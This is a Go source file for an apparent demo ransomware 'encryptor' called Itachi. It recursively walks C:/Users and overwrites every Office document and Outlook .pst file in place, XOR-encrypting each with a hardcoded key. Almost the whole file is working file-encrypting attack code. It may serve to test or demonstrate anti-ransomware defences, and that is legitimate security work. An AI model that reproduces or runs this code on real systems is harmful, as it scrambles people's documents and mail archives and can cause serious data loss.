/***************************************************************
*
* Itachi (c) 2022 by Michael Kondrashin (mkondrashin@gmail.com)
* Copyright under MIT Lincese. Please see LICENSE file for details
*
* main.go - encryptor - encrypt all MS Office files in C:\Users
* folder
*
***************************************************************/

package main

import (
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

var Unique = "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"

var targets = []string{
	".doc",
	".docx",
	".ppt",
	".pptx",
	".xls",
	".xlsx",
	".pst",
}

var secret = "secret password"

func encrypt(fileName string, secret string) error {
	f, err := os.OpenFile(fileName, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	fmt.Printf("Encrypt %s: Start\n", fileName)
	const bufSize = 8 * 1024
	buffer := make([]byte, bufSize)
	secretIndex := 0
	for {
		n, err := f.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
		for i := 0; i < n; i++ {
			buffer[i] ^= secret[secretIndex]
			secretIndex++
			if secretIndex == len(secret) {
				secretIndex = 0
			}
		}
		f.Seek(-int64(n), os.SEEK_CUR)
		_, err = f.Write(buffer[:n])
		if err != nil {
			return err
		}
	}

	fmt.Printf("Encrypt %s: Done\n", fileName)
	return nil
}

func isTarget(name string) bool {
	ext := filepath.Ext(name)
	for _, t := range targets {
		if strings.EqualFold(t, ext) {
			return true
		}
	}
	return false
}

func encryptDirRecursive(dir string) error {
	count := 0
	fmt.Printf("Start encryption in %s\n", dir)
	err := filepath.Walk(dir, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.Mode().IsRegular() {
			return nil
		}
		if !isTarget(path) {
			return nil
		}
		err = encrypt(path, secret)
		if err != nil {
			return fmt.Errorf("%v: %w", path, err)
		}
		count++
		return nil
	})
	fmt.Printf("Encrypted %d files\n", count)
	return err
}

func main() {
	fmt.Printf("Demo Encryptor (%s)\n", Unique)
	folder := "C:/Users"
	if err := encryptDirRecursive(folder); err != nil {
		fmt.Printf("%s: %v\n", folder, err)
	}
}
